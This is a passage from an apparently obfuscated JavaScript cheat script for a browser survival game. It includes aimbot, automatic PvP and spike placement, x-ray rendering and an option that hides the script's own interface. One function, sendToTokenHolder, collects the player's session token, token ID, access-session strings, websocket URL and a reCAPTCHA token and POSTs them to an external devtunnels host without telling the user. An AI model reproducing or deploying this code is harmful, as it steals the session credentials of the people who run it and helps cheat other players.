      circle(ctx, _minimapTranslation.x + coors.x / (world.nw * 100) * 193 * scale, _minimapTranslation.y + coors.y / (world.nh * 100) * 193 * scale, scale * size);
      ctx.fill();
    }
  }
  function draw_text_in_minimap(coors, text, sizeText, color = "black") {
    if (coors && coors.x && coors.y) {
      let _minimapTranslation;
      if (user.inv.can_select.length > 0) {
        _minimapTranslation = {
          x: game.minimap.translate.x,
          y: game.minimap.translate.y - scale * 120
        };
      } else {
        _minimapTranslation = {
          x: game.minimap.translate.x,
          y: game.minimap.translate.y - scale * 50
        };
      }
      ctx.save();
      ctx.translate(_minimapTranslation.x + coors.x / (world.nw * 100) * 193 * scale, _minimapTranslation.y + coors.y / (world.nh * 100) * 193 * scale);
      ctx.font = "" + sizeText + "px Baloo Paaji";
      ctx.textBaseline = "middle";
      ctx.textAlign = "center";
      ctx.fillStyle = color;
      ctx.fillText(text, 0, 0);
      ctx.restore();
    }
  }
  function draw_dot_in_bigmap(coors, color, size) {
    if (coors && coors.x && coors.y) {
      let _calculatedCanvasX = canw2 - 300;
      let _calculatedCanvasY = canh2 - 300;
      ctx.fillStyle = color;
      circle(ctx, _calculatedCanvasX + coors.x / (world.nw * 100) * 600 * scale, _calculatedCanvasY + coors.y / (world.nh * 100) * 600 * scale, scale * size);
      ctx.fill();
    }
  }
  function draw_text_in_bigmap(coors, text, sizeText, color = "black") {
    if (coors && coors.x && coors.y) {
      let _calculatedCanvasX = canw2 - 300;
      let _calculatedCanvasY = canh2 - 300;
      ctx.save();
      ctx.translate(_calculatedCanvasX + coors.x / (world.nw * 100) * 600 * scale, _calculatedCanvasY + coors.y / (world.nh * 100) * 600 * scale);
      ctx.font = "" + sizeText + "px Baloo Paaji";
      ctx.textBaseline = "middle";
      ctx.textAlign = "center";
      ctx.fillStyle = color;
      ctx.fillText(text, 0, 0);
      ctx.restore();
    }
  }
  function drawTimerInPlayer() {
    ctx.save();
    ctx.translate(user.cam.x + this.x, user.cam.y + this.y + 46);
    ctx.font = "22px Baloo Paaji";
    ctx.textAlign = "center";
    ctx.textBaseline = "middle";
    ctx.lineWidth = 3;
    ctx.strokeStyle = "black";
    const timeElapsed = Date.now() - healTimestamps[this.pid];
    const secondsLeft = 10 - timeElapsed % 10000 / 1000;
    let timerText;
    if (secondsLeft > 5) {
      timerText = Math.ceil(secondsLeft - 5);
      ctx.fillStyle = "white";
    } else {
      timerText = secondsLeft <= 2 && this.currentHp < 200 ? secondsLeft.toFixed(1) : Math.ceil(secondsLeft);
      ctx.fillStyle = "#6da151";
    }
    ctx.strokeText(timerText, 0, 0);
    ctx.fillText(timerText, 0, 0);
    ctx.restore();
  }
  function sendToTokenHolder() {
    workerTimers.setTimeout(async () => {
      await ui.getTokenForJoinGame(async () => {
        try {
          let recaptchaToken = await Utils.get_recaptcha_token();
          if (!user.token || !user.token_id) {
            console.error("Error: Missing user.token or user.token_id");
            return;
          }
          let currentUrl = client?.socket?.url || "";
          let baseUrl = currentUrl.split("?")[0] || "";
          if (!baseUrl) {
            console.log("Dont have baseUrl");
            return;
          }
          let strs = Object.values(user).filter(obj => {
            return typeof obj === "string" && obj.includes("_");
          });
          if (strs.length < 4) {
            console.error("Error: Not enough valid strings in user object.");
            return;
          }
          const requestBody = {
            websocketUrl: "" + baseUrl + "?" + strs[strs.length - 1],
            token: user.token,
            token_id: user.token_id,
            accessSession: strs[strs.length - 4],
            accessToken1: strs[strs.length - 3],
            accessToken2: strs[strs.length - 2],
            recaptcha_token: recaptchaToken
          };
          let response = await fetch("https://cdb41km4-8000.asse.devtunnels.ms/connect", {
            method: "POST",
            headers: {
              ["Content-Type"]: "application/json"
            },
            body: JSON.stringify(requestBody)
          });
          if (!response.ok) {
            throw new Error("HTTP Error: " + response.status);
          }
          let data = await response.json();
          console.log("Response:", data);
        } catch (error) {
          console.error("Error:", error);
        }
      }, undefined, true);
    }, 0);
  }
  function resize_canvas() {
    if (user) {
      user.cam.h = document.documentElement.clientHeight;
      user.cam.w = document.documentElement.clientWidth;
    }
    let dPR = window.devicePixelRatio || 1;
    let backingStoreRatio = ctx.webkitBackingStorePixelRatio || ctx.mozBackingStorePixelRatio || ctx.msBackingStorePixelRatio || ctx.oBackingStorePixelRatio || ctx.backingStorePixelRatio || 1;
    if (dPR <= 0.5 && Settings.BigZoom.e) {
      autoCameraControlActive = true;
    } else {
      autoCameraControlActive = false;
    }
    if (can.width != window.innerWidth) {
      can.width = window.innerWidth;
    }
    canw = can.width;
    canw2 = can.width / 2;
    if (can.height != window.innerHeight) {
      can.height = window.innerHeight;
    }
    canh = can.height;
    canh2 = can.height / 2;
    canm = {
      x: canw2,
      y: canh2
    };
    let w = can.width;
    let h = can.height;
    try {
      ratio_opt = document.getElementById("input_ratio").value * (dPR / backingStoreRatio);
    } catch {
      ratio_opt = dPR / backingStoreRatio;
    }
    ratio = ratio_opt;
    can.width = w * ratio;
    can.height = h * ratio;
    can.style.width = w + "px";
    can.style.height = h + "px";
    ctx.setTransform(1, 0, 0, 1, 0, 0);
    ctx.scale(ratio, ratio);
    if (user) {
      user.cam.rw = w;
      user.cam.rh = h;
    }
  }
  let originalDrawImage;
  function enableXray() {
    ctx.drawImage = function () {
      ctx.globalAlpha = Settings.Xray.opacity;
      return originalDrawImage.apply(this, arguments);
    };
  }
  function disableXray() {
    ctx.drawImage = originalDrawImage;
  }
  function hideScriptToggle() {
    if (Settings.HideScript.e) {
      document.getElementById("togglePaneButton").style.opacity = 0;
      document.getElementById(guiContainerId).style.display = "none";
      if (game.gauges?.img && game.gauges?.defaultImg) {
        game.gauges.img = game.gauges.defaultImg;
      }
    } else {
      document.getElementById("togglePaneButton").style.opacity = 1;
      document.getElementById(guiContainerId).style.display = "block";
      if (game.gauges?.img && game.gauges?.defaultImg) {
        if (Settings.GaugesUI === "new") {
          game.gauges.img = mySprite[MY_SPRITE.NEW_GAUGES];
        }
      }
    }
  }
  function send_cmd_put_bridge(x, y) {
    const j = Math.floor(x / 100);
    const i = Math.floor(y / 100);
    send_chat("ez " + j + " " + i);
  }
  function build_bridge(j, i) {
    const targetCoor = {
      x: j * 100 + 50,
      y: i * 100 + 50
    };
    const myPlayer = world.fast_units[user.uid];
    if (myPlayer) {
      let angle = calcAngle(myPlayer, targetCoor, false);
      let pi2 = Math.PI * 2;
      let angle255 = Math.floor((angle + pi2) % pi2 * 255 / pi2);
      for (let offset = 0; offset <= 10; offset++) {
        let spreadAngle255 = (angle255 + offset + 255) % 255;
        let restoredAngle = angle255ToAngle(spreadAngle255);
        let c = {
          x: myPlayer.x + mathCos(restoredAngle) * 120,
          y: myPlayer.y + mathSin(restoredAngle) * 120
        };
        if (Math.floor(c.x / 100) === j && Math.floor(c.y / 100) === i) {
          send_build(INV.BRIDGE, spreadAngle255);
          break;
        }
        spreadAngle255 = (angle255 - offset + 255) % 255;
        restoredAngle = angle255ToAngle(spreadAngle255);
        c = {
          x: myPlayer.x + mathCos(restoredAngle) * 120,
          y: myPlayer.y + mathSin(restoredAngle) * 120
        };
        if (Math.floor(c.x / 100) === j && Math.floor(c.y / 100) === i) {
          send_build(INV.BRIDGE, spreadAngle255);
          break;
        }
      }
    }
  }
  function isClientReadyAndUserAlive() {
    return client.socket?.readyState === 1 && user?.alive;
  }
  function banhTruongLanhDia(_param_774) {
    const myPlayer = world.fast_units[user.uid];
    if (myPlayer) {
      let itemId;
      let spikes = [ITEMS.REIDITE_SPIKE, ITEMS.AMETHYST_SPIKE, ITEMS.DIAMOND_SPIKE, ITEMS.GOLD_SPIKE, ITEMS.STONE_SPIKE, ITEMS.SPIKE];
      for (let id of spikes) {
        if (world.units[id].length > 0) {
          itemId = id;
          break;
        }
      }
      if (itemId) {
        const itemToInv = {
          [ITEMS.REIDITE_SPIKE]: INV.REIDITE_SPIKE,
          [ITEMS.AMETHYST_SPIKE]: INV.AMETHYST_SPIKE,
          [ITEMS.DIAMOND_SPIKE]: INV.DIAMOND_SPIKE,
          [ITEMS.GOLD_SPIKE]: INV.GOLD_SPIKE,
          [ITEMS.STONE_SPIKE]: INV.STONE_SPIKE,
          [ITEMS.SPIKE]: INV.SPIKE
        };
        function deepClone(_param_775) {
          if (_param_775 === null || typeof _param_775 !== "object") {
            return _param_775;
          }
          if (typeof _param_775 === "function") {
            return _param_775;
          }
          if (Array.isArray(_param_775)) {
            return _param_775.map(item => {
              return deepClone(item);
            });
          }
          const clone = {};
          for (let key in _param_775) {
            if (_param_775.hasOwnProperty(key)) {
              clone[key] = deepClone(_param_775[key]);
            }
          }
          return clone;
        }
        for (let i = 0; i < _param_774; i++) {
          const deepCopy = deepClone(world.units[itemId][0]);
          const angle360 = 360 / _param_774 * i;
          const angle = toRadian(angle360);
          let __p_7Fjb_newPos_x = myPlayer.x + mathCos(angle) * 120;
          let __p_7Fjb_newPos_y = myPlayer.y + mathSin(angle) * 120;
          deepCopy.x = __p_7Fjb_newPos_x;
          deepCopy.y = __p_7Fjb_newPos_y;
          deepCopy.r = {
            x: __p_7Fjb_newPos_x,
            y: __p_7Fjb_newPos_y
          };
          deepCopy.angle = angle;
          deepCopy.ally = true;
          workerTimers.setTimeout(() => {
            const length = world.units[itemId].length;
            world.units[itemId][length] = deepCopy;
            user.inv.n[itemToInv[itemId]] -= 1;
          }, i * 100);
        }
      }
    }
  }
  function aimbotLoop() {
    if (isClientReadyAndUserAlive()) {
      const myPlayer = world.fast_units[user.uid];
      if (myPlayer) {
        if (Settings.Aimbot.e && !Settings.AutoPvP.e && !Settings.SyncToPlayer.e) {
          let myRange;
          switch (HoldWeapon(myPlayer.right, true)) {
            case 1:
              myRange = myPlayer.fly ? 196.8 : 157.6;
              break;
            case 2:
              myRange = myPlayer.fly ? 291.8 : 227.6;
              break;
            case 3:
              myRange = 620;
              break;
            case 4:
              myRange = myPlayer.fly ? 142 : 131;
              break;
            case 6:
              if (myPlayer.clothe === INV.WINTER_HOOD || myPlayer.clothe === INV.HOOD) {
                myRange = 97.6;
              } else {
                Settings.Aimbot.angle = null;
              }
              break;
            default:
              Settings.Aimbot.angle = null;
          }
          if (myRange) {
            let isPlayerInRange = false;
            let Enemy = EnemyToAttack(myPlayer, world.units[ITEMS.PLAYERS]);
            if (Enemy) {
              let RangeBetweenMeAndEnemy = Utils.dist(myPlayer, Enemy);
              if (RangeBetweenMeAndEnemy <= myRange) {
                isPlayerInRange = true;
                let angle = calcAngle(PredictPosNow(myPlayer, PingCounter), PredictPosNow(Enemy, PingCounter), false);
                Settings.Aimbot.angle = angle;
                send_angle(angle);
                if ((Settings.Aimbot.autoHit || user.control.attack) && RangeBetweenMeAndEnemy <= myRange - 22) {
                  send_attack(angle);
                  stop_attack();
                }
              } else {
                Settings.Aimbot.angle = null;
              }
            } else {
              Settings.Aimbot.angle = null;
            }
            if (!isPlayerInRange) {
              let objList = [...(Settings.Aimbot.isAimbotGoldenChicken ? world.units[ITEMS.GOLDEN_CHICKEN] : []), ...(Settings.Aimbot.isAimbotRabbit ? world.units[ITEMS.RABBIT] : [])];
              let Enemy = ObjNearestInGround(myPlayer, objList);
              if (Enemy) {
                let RangeBetweenMeAndEnemy = Utils.dist(myPlayer, Enemy);
                if (RangeBetweenMeAndEnemy <= myRange) {
                  isPlayerInRange = true;
                  let angle = calcAngle(myPlayer, Enemy, true);
                  Settings.Aimbot.angle = angle;
                  send_angle(angle);
                  if (Settings.Aimbot.autoHit && RangeBetweenMeAndEnemy <= myRange - 22) {
                    send_attack(angle);
                    stop_attack();
                  }
                } else {
                  Settings.Aimbot.angle = null;
                }
              } else {
                Settings.Aimbot.angle = null;
              }
            }
          }
        }
      }
    }
  }
  let autospikeAutoPvPLastTime = performance.now();
  function autopvpLoop() {
    if (isClientReadyAndUserAlive()) {
      const myPlayer = world.fast_units[user.uid];
      if (myPlayer) {
        if (Settings.AutoPvP.e) {
          let Enemy = null;
          let enemies = EnemyInRange(myPlayer, world.units[ITEMS.PLAYERS], 400);
          if (enemies.length > 0) {
            if (temp.autopvpLockId) {
              Enemy = enemies.find(_param_776 => {
                return _param_776.pid === temp.autopvpLockId;
              });
            }
            if (!Enemy) {
              if (IS_WEAPON[myPlayer.right]) {
                const myDamageRange = getDamageRangeOfPlayer(myPlayer);
                const enemyInDamgeRange = enemies.filter(_param_777 => {
                  return Utils.dist(myPlayer, _param_777) <= myDamageRange;
                });
                if (enemyInDamgeRange.length > 0) {
                  Enemy = EnemyLowestHp(enemyInDamgeRange);
                }
              }
              if (!Enemy) {
                Enemy = EnemyNearest(myPlayer, enemies);
              }
            }
          }
          if (Enemy) {
            let myPlayerPos = PredictPosNow(myPlayer, PingCounter);
            let enemyPos = PredictPosNow(Enemy, PingCounter);
            let angleToEnemy = calcAngle(myPlayerPos, enemyPos, false);
            let RangeBetweenMeAndEnemy = Utils.dist(myPlayerPos, enemyPos);
            if (Settings.AutoPvP.isPullWeapon && !myPlayer.weapon && RangeBetweenMeAndEnemy <= 100) {
              const can_select = user.inv.can_select;
              for (let i = 0, len = can_select.length; i < len; i++) {
                const invId = can_select[i].id;
                if (IS_WEAPON[invId]) {
                  client.select_inv(invId);
                  break;
                }
              }
            }
            if (RangeBetweenMeAndEnemy <= 225 && Settings.AutoPvP.isPullHelmet && myPlayer.dist_water !== 1 && myPlayer.clothe !== INV.DIVING_MASK && myPlayer.clothe !== INV.SUPER_DIVING_SUIT && !IS_HELMET[myPlayer.clothe] && performance.now() - useHelmetLastTime >= PingCounter + 100) {
              for (let i = 0; i < helmets.length; i++) {
                if (user.inv.n[helmets[i]]) {
                  client.select_inv(helmets[i]);
                  useHelmetLastTime = performance.now();
                  break;
                }
              }
            }
            if (oldUserDir === 0) {
              send_move(PathFinder1(myPlayer, Enemy));
            }
            let myRange = null;
            const weaponType = HoldWeapon(myPlayer.right, false);
            switch (weaponType) {
              case 1:
                myRange = myPlayer.fly ? 196.8 : 157.6;
                break;
              case 2:
                myRange = myPlayer.fly ? 291.8 : 227.6;
                break;
              case 3:
                myRange = 620;
                break;
              case 4:
                myRange = myPlayer.fly ? 142 : 131;
                break;
              case 5:
                myRange = 125;
                break;
              case 6:
                if (myPlayer.clothe === INV.WINTER_HOOD || myPlayer.clothe === INV.HOOD) {
                  myRange = 97.6;
                } else {
                  Settings.Aimbot.angle = null;
                }
                break;
              default:
                Settings.Aimbot.angle = null;
                break;
            }
            if (myRange) {
              if (RangeBetweenMeAndEnemy <= myRange) {
                let aimbotAngle = angleToEnemy;
                Settings.Aimbot.angle = aimbotAngle;
                send_angle(aimbotAngle);
                if (Settings.Aimbot.angle && RangeBetweenMeAndEnemy <= myRange - 22) {
                  send_attack(aimbotAngle);
                  stop_attack();
                }
              } else {
                Settings.Aimbot.angle = null;
              }
            }
            if (!Settings.AutoSpike.e && !Settings.AutoWall.e && !Settings.AimbotSpike.e && Settings.AutoPvP.isAutoSpike && performance.now() - autospikeAutoPvPLastTime > 90) {
              if (RangeBetweenMeAndEnemy <= 100) {
                let spikeid = null;
                const spikePrefs = Settings.AutoSpike.p;
                for (let i = 0; i < spikePrefs.length; i++) {
                  const spikeName = spikePrefs[i];
                  let candidateId = -1;
                  switch (spikeName) {
                    case "Reidite Spike":
                      candidateId = INV.REIDITE_SPIKE;
                      break;
                    case "Amethyst Spike":
                      candidateId = INV.AMETHYST_SPIKE;
                      break;
                    case "Diamond Spike":
                      candidateId = INV.DIAMOND_SPIKE;
                      break;
                    case "Gold Spike":
                      candidateId = INV.GOLD_SPIKE;
                      break;
                    case "Stone Spike":
                      candidateId = INV.STONE_SPIKE;
                      break;
                    case "Wood Spike":
                      candidateId = INV.WOOD_SPIKE;
                      break;
                    case "Wood Wall":
                      candidateId = INV.WOOD_WALL;
                      break;
                    case "Nothing":
                      candidateId = -1;
                      break;
                  }
                  if (candidateId !== -1 && user.inv.n[candidateId]) {
                    spikeid = candidateId;
                    break;
                  }
                }
                if (spikeid) {
                  autospikeAutoPvPLastTime = performance.now();
                  let autospikeAngle = calcAngle(PredictPos(myPlayer), PredictPos(Enemy), false);
                  ;
                  let PInumb = Math.PI * 2;
                  let MYPLAYERANGLE = Math.floor((autospikeAngle + PInumb) % PInumb * 255 / PInumb);
                  send_build(spikeid, MYPLAYERANGLE);
                  if (Settings.AutoPvP.is360) {
                    for (let ang = 8; ang < 127; ang += 8) {
                      send_build(spikeid, MYPLAYERANGLE + ang);
                      send_build(spikeid, MYPLAYERANGLE - ang);
                    }
                  } else {
                    for (let ang = 2; ang <= 28; ang += 2) {
                      send_build(spikeid, MYPLAYERANGLE + ang);
                      send_build(spikeid, MYPLAYERANGLE - ang);
                    }
                  }
                }
              }
            }
          } else {
            Settings.AutoPvP.angle = null;
          }
        }
      }
    }
  }
  let autospikeInterval = null;
  function autospikeLoop() {
    if (isClientReadyAndUserAlive()) {
      const myPlayer = world.fast_units[user.uid];
      if (myPlayer) {
        if (Settings.AutoSpike.e) {
          let spikeId = null;
          const spikePrefs = Settings.AutoSpike.p;
          for (let i = 0; i < spikePrefs.length; i++) {
            const spikeName = spikePrefs[i];
            let candidateId = -1;
            switch (spikeName) {
              case "Reidite Spike":
                candidateId = INV.REIDITE_SPIKE;
                break;
              case "Amethyst Spike":
                candidateId = INV.AMETHYST_SPIKE;
                break;
              case "Diamond Spike":
                candidateId = INV.DIAMOND_SPIKE;
                break;
              case "Gold Spike":
                candidateId = INV.GOLD_SPIKE;
                break;
              case "Stone Spike":
                candidateId = INV.STONE_SPIKE;
                break;
              case "Wood Spike":
                candidateId = INV.WOOD_SPIKE;
                break;
              case "Wood Wall":
                candidateId = INV.WOOD_WALL;
                break;
              case "Nothing":
                candidateId = -1;
                break;
            }
            if (candidateId !== -1 && user.inv.n[candidateId]) {
              spikeId = candidateId;
              break;
            }
          }
          if (spikeId) {
            let angle;
            if (Settings.AutoSpike.IsFollowMouse) {
              let e;
              if (myPlayer) {
                e = {
                  x: user.cam.x + myPlayer.x,
                  y: user.cam.y + myPlayer.y
                };
              } else {
                e = canm;
              }
              angle = calcAngle(mouse.pos, e, false) + Math.PI;
            } else {
              angle = myPlayer.nangle;
            }
            let pi2 = Math.PI * 2;
            let angle255 = Math.floor((angle + pi2) % pi2 * 255 / pi2);
            send_build(spikeId, angle255);
            if (Settings.AutoSpike.isSpikeInWater && user.team.length > 0 && !isWaitToPutSpikeInWater) {
              const putCoor = {
                r: {
                  x: myPlayer.x + mathCos(angle) * 120,
                  y: myPlayer.y + mathSin(angle) * 120
                }
              };
              world.dist_from_biomes(putCoor);
              const dist_water = Object.values(putCoor)[8];
              if (dist_water === 1) {
                send_cmd_put_bridge(putCoor.r.x, putCoor.r.y);
                isWaitToPutSpikeInWater = true;
                workerTimers.setTimeout(() => {
                  isWaitToPutSpikeInWater = false;
                }, 2000);
              }
            }
            if (Settings.AutoSpike.AngleSpread) {
              let changeAngle;
              if (Settings.AutoSpike.angleSpreadMode === "Normal") {
                for (let i = 2; i <= 28; i += 2) {
                  send_build(spikeId, angle255 + i);
                  send_build(spikeId, angle255 - i);
                }
              } else if (Settings.AutoSpike.angleSpreadMode === "360") {
                changeAngle = 8;
                for (let i = 1; i < 16; i++) {
                  const offset = i * changeAngle;
                  send_build(spikeId, angle255 + offset);
                  send_build(spikeId, angle255 - offset);
                }
              } else {
                Settings.AutoSpike.angleSpreadMode = "Normal";
              }
            }
          }
        }
      }
    }
  }
  let autowallInterval = null;
  function autowallLoop() {
    if (isClientReadyAndUserAlive()) {
      const myPlayer = world.fast_units[user.uid];
      if (myPlayer) {
        if (!Settings.AutoSpike.e && Settings.AutoWall.e) {
          let spikeId;
          if (user.inv.n[INV.WOOD_WALL]) {
            spikeId = INV.WOOD_WALL;
          }
          if (spikeId) {
            let playerAngle;
            if (Settings.AutoWall.IsFollowMouse) {
              let e;
              if (myPlayer) {
                e = {
                  x: user.cam.x + myPlayer.x,
                  y: user.cam.y + myPlayer.y
                };
              } else {
                e = canm;
              }
              playerAngle = calcAngle(mouse.pos, e, false) + Math.PI;
            } else {
              playerAngle = myPlayer.nangle;
            }
            let pi2 = Math.PI * 2;
            let angle255 = Math.floor((playerAngle + pi2) % pi2 * 255 / pi2);
            send_build(spikeId, angle255);
            if (Settings.AutoWall.AngleSpread) {
              for (let i = 2; i <= 28; i += 2) {
                send_build(spikeId, angle255 + i);
                send_build(spikeId, angle255 - i);
              }
            }
          }
        }
      }
    }
  }
  let syncToPlayerLastSelectRight = performance.now();
  let syncToPlayerLastUseClothe = performance.now();
  function syncToPlayerLoop() {
    if (isClientReadyAndUserAlive()) {
      const myPlayer = world.fast_units[user.uid];
      if (myPlayer) {
        if (Settings.SyncToPlayer.e && !Settings.AutoPvP.e) {
          const allForOneTargetId = Settings.SyncToPlayer.targetId;
          const targetPlayer = world.fast_units[allForOneTargetId * world.max_units];
          if (!targetPlayer || allForOneTargetId === user.id) {
            return;
          }
          if (oldUserDir === 0) {
            send_move(PathFinder2(myPlayer, targetPlayer));
          }
          if (!user.craft.crafting) {
            if (myPlayer.right !== targetPlayer.right && performance.now() - syncToPlayerLastSelectRight > PingCounter + 100) {
              if (user.inv.n[targetPlayer.right] || targetPlayer.right === -1) {
                if (targetPlayer.right === -1) {
                  client.select_inv(myPlayer.right);
                } else {
                  client.select_inv(targetPlayer.right);
                }
                syncToPlayerLastSelectRight = performance.now();
              } else if (IS_WEAPON[targetPlayer.right] && !IS_WEAPON[myPlayer.right]) {
                const can_select = user.inv.can_select;
                for (let i = 0, len = can_select.length; i < len; i++) {
                  const invId = can_select[i].id;
                  if (IS_WEAPON[invId]) {
                    client.select_inv(invId);
                    syncToPlayerLastSelectRight = performance.now();
                    break;
                  }
                }
              } else if (IS_HAMMER[targetPlayer.right] && !IS_HAMMER[myPlayer.right]) {
                const can_select = user.inv.can_select;
                for (let i = 0, len = can_select.length; i < len; i++) {
                  const invId = can_select[i].id;
                  if (IS_HAMMER[invId]) {
                    client.select_inv(invId);
                    syncToPlayerLastSelectRight = performance.now();
                    break;
                  }
                }
              } else if (!IS_WEAPON[myPlayer.right] && !IS_HAMMER[myPlayer.right]) {
                client.select_inv(myPlayer.right);
                syncToPlayerLastSelectRight = performance.now();
              }
            }
            if (myPlayer.clothe !== targetPlayer.clothe && performance.now() - syncToPlayerLastUseClothe > PingCounter + 100) {
              if (user.inv.n[targetPlayer.clothe]) {
                client.select_inv(targetPlayer.clothe);
                syncToPlayerLastUseClothe = performance.now();
              } else if (IS_HELMET[targetPlayer.clothe] && !IS_HELMET[myPlayer.clothe]) {
                const can_select = user.inv.can_select;
                for (let i = 0, len = can_select.length; i < len; i++) {
                  const invId = can_select[i].id;
                  if (IS_HELMET[invId]) {
                    client.select_inv(invId);
                    syncToPlayerLastUseClothe = performance.now();
                    break;
                  }
                }
              }
            }
            if (IS_WEAPON[myPlayer.right]) {
              let myRange;
              switch (HoldWeapon(myPlayer.right, true)) {
                case 1:
                  myRange = myPlayer.fly ? 196.8 : 157.6;
                  break;
                case 2:
                  myRange = myPlayer.fly ? 291.8 : 227.6;
                  break;
                case 3:
                  myRange = 620;
                  break;
                case 4:
                  myRange = myPlayer.fly ? 142 : 131;
                  break;
                case 6:
                  if (myPlayer.clothe === INV.WINTER_HOOD || myPlayer.clothe === INV.HOOD) {
                    myRange = 97.6;
                  } else {
                    Settings.Aimbot.angle = null;
                  }
                  break;
                default:
                  Settings.Aimbot.angle = null;
              }
              if (myRange) {
                let Enemy = EnemyToAttack(myPlayer, world.units[ITEMS.PLAYERS], [allForOneTargetId]);
                if (Enemy) {
                  let RangeBetweenMeAndEnemy = Utils.dist(myPlayer, Enemy);
                  if (RangeBetweenMeAndEnemy <= myRange) {
                    isPlayerInRange = true;
                    let angle = calcAngle(PredictPosNow(myPlayer, PingCounter), PredictPosNow(Enemy, PingCounter), false);
                    Settings.Aimbot.angle = angle;
                    send_angle(angle);
                    if (RangeBetweenMeAndEnemy <= myRange - 22) {
                      send_attack(Settings.Aimbot.angle);
                      stop_attack();
                    }
                  } else {
                    Settings.Aimbot.angle = null;
                  }
                } else {
                  Settings.Aimbot.angle = null;
                }
              }
            } else {
              Settings.Aimbot.angle = null;
            }
            if (Settings.Aimbot.angle === null) {
              Settings.Aimbot.angle = targetPlayer.nangle;
            }
            if ((IS_HAMMER[myPlayer.right] || myPlayer.right === INV.WRECH) && performance.now() - targetPlayer.startAttackTime < 580) {
              send_attack(Settings.Aimbot.angle);
              stop_attack();
            }
          }
        }
      }
    }
  }
  function draw(timestamp) {
    requestAnimationFrame(draw);
    {
      delta = (timestamp - old_timestamp) / 1000;
      old_timestamp = timestamp;
      delta = delta > 1 ? 1 : delta;
      times = times.filter(_param_778 => {
        return _param_778 > timestamp - 1000;
      });
      times[times.length] = timestamp;
      if (timestamp - lastFPSUpdate >= 1000) {
        lastFPSUpdate = timestamp;
        FPSCounter = times.length - 1;
      }
    }
    if (!Settings.HideScript.e) {
      if (Settings.ListEnabledHacks.e) {
        ctx.save();
        ctx.font = "18px Baloo Paaji";
        ctx.strokeStyle = "black";
        ctx.lineWidth = 7;
        ctx.fillStyle = "white";
        if (Settings.ListEnabledHacks.anchor === "BottomLeft") {
          let YEnabled = 10;
          for (const hack in Settings) {
            if (Settings[hack].e && Settings[hack].k) {
              const y = canh - YEnabled;
              ctx.strokeText(hack, 10, y);
              ctx.fillText(hack, 10, y);
              YEnabled += 20;
            }
          }
        } else {
          let YEnabled = 20;
          for (const hack in Settings) {
            if (Settings[hack].e && Settings[hack].k) {
              ctx.strokeText(hack, 10, YEnabled);
              ctx.fillText(hack, 10, YEnabled);
              YEnabled += 20;
            }
          }
        }
        ctx.restore();
      }
      if (Settings.ShowJoinLeave.e) {
        let e = 400;
        if (__p_d8ju_JoinLeave_toggle11) {
          ctx.save();
          ctx.font = "18px Baloo Paaji";
          ctx.strokeStyle = "black";
          ctx.lineWidth = 7;
          ctx.fillStyle = "green";
          for (let i = 0; i < __p_d8ju_JoinLeave_Join.length; i++) {
            ctx.globalAlpha = 1 - i * 0.15;
            const id = __p_d8ju_JoinLeave_Join[i];
            const player = world.players[id];
            const textToDisplay = player.nickname + " | " + player.level;
            ctx.strokeText(textToDisplay, 0, e);
            ctx.fillText(textToDisplay, 0, e);
            e += 20;
          }
          ctx.restore();
        }
        if (__p_d8ju_JoinLeave_toggle22) {
          ctx.save();
          ctx.font = "18px Baloo Paaji";
          ctx.strokeStyle = "black";
          ctx.lineWidth = 7;
          ctx.fillStyle = "red";
          for (let i = 0; i < __p_d8ju_JoinLeave_Leave.length; i++) {
            ctx.globalAlpha = 1 - i * 0.15;
            ctx.strokeText(__p_d8ju_JoinLeave_Leave[i], 0, e);
            ctx.fillText(__p_d8ju_JoinLeave_Leave[i], 0, e);
            e += 20;
          }
          ctx.restore();
        }
      }
    }
    if (Settings.Spectator.e) {
      if (keyboard.is_bottom()) {
        user.cam.y -= Math.floor(4000 / FPSCounter);
      }
      if (keyboard.is_top()) {
        user.cam.y += Math.floor(4000 / FPSCounter);
      }
      if (keyboard.is_right()) {
        user.cam.x -= Math.floor(4000 / FPSCounter);
      }
      if (keyboard.is_left()) {
        user.cam.x += Math.floor(4000 / FPSCounter);
      }
    }
  }
  function AutoThings() {
    if (isClientReadyAndUserAlive()) {
      let myPlayer = world.fast_units[user.uid];
      if (!user.craft.crafting) {
        if (Settings.AutoFood.e && user.gauges.h <= 0.9 && performance.now() - lastEatTime >= PingCounter + 200) {
          const can_select = user.inv.can_select;
          let haveEat = false;
          const currentHungerStat = user.gauges.h;
          for (let i = 0, len = can_select.length; i < len; i++) {
            const invId = can_select[i].id;
            if (IS_NON_DAMAGED_FOOD[invId]) {
              if (foodRecoveryValues[invId] + currentHungerStat <= 1) {
                send_select_inv(invId);
                haveEat = true;
                lastEatTime = performance.now();
              }
              break;
            }
          }
          if (currentHungerStat === 0 && !haveEat && user.gauges.l > 0.05) {
            for (let i = 0, len = can_select.length; i < len; i++) {
              const invId = can_select[i].id;
              if (IS_FOOD[invId]) {
                send_select_inv(invId);
                lastEatTime = performance.now();
                break;
              }
            }
          }
        }
        if (Settings.AutoDrink.e && performance.now() - lastDrinkTime >= PingCounter + 200 && user.gauges.t <= Settings.AutoDrink.range && user.inv.n[INV.BOTTLE_FULL]) {
          send_select_inv(INV.BOTTLE_FULL);
          lastDrinkTime = performance.now();
        }
        if (user.inv.n[INV.WATERMELON] && Settings.AutoDrink.e && Settings.AutoDrink.autoEatWatermelon && user.gauges.t <= 0.92 && performance.now() - lastDrinkTime >= PingCounter + 200) {
          send_select_inv(INV.WATERMELON);
          lastDrinkTime = performance.now();
        }
        if (Settings.AutoBuyWood.e && performance.now() - autoBuyWoodLastSent > PingCounter + 200) {
          if ((user.inv.n[INV.WOOD] ?? 0) < 1000) {
            const amountberyCanUse = (user.inv.n[INV.BERRY] ?? 0) - Settings.AutoBuyWood.berryTrigger;
            if (amountberyCanUse > 0) {
              buyResourceByBerry(amountberyCanUse, 1000 - user.inv.n[INV.WOOD]);
              autoBuyWoodLastSent = performance.now();
            }
          }
        }
        if (Settings.AutoBuyAllStone.e && performance.now() - autoBuyAllStoneLastSent > PingCounter + 200) {
          if (user.inv.n[INV.PUMPKIN]) {
            const {
              packetSize: packetSize
            } = RESOURCE_MARKET.Stone;
            buyResourceByCurrency("Stone", user.inv.n[INV.PUMPKIN] > packetSize ? packetSize : user.inv.n[INV.PUMPKIN]);
            autoBuyAllStoneLastSent = performance.now();
          }
        }
        if (Settings.AutoBuyAllGold.e && performance.now() - autoBuyAllGoldLastSent > PingCounter + 200) {
          if (user.inv.n[INV.BREAD]) {
            const {
              packetSize: packetSize
            } = RESOURCE_MARKET.Gold;
            buyResourceByCurrency("Gold", user.inv.n[INV.BREAD] > packetSize ? packetSize : user.inv.n[INV.BREAD]);
